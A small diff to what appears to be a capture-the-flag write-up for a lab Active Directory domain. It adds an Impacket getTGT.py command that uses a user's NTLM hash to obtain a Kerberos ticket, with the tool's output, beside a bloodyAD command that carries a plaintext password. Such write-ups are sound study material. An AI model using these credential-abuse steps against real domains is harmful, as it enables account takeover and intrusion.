@@ -1238,6 +1238,15 @@ bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u john.w -p 'Pack_Beneath_So
 Ill set the UPN of the user
 
 ```python
+getTGT.py -hashes ':957246c8137069bca672dc6aa0af7c7a' -principalType 'NT_ENTERPRISE' darkcorp.htb/angela.w.adm
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in angela.w.adm.ccache
+```
+
+Then ill request a TGT for this user
+
+```python
 
 ```
 
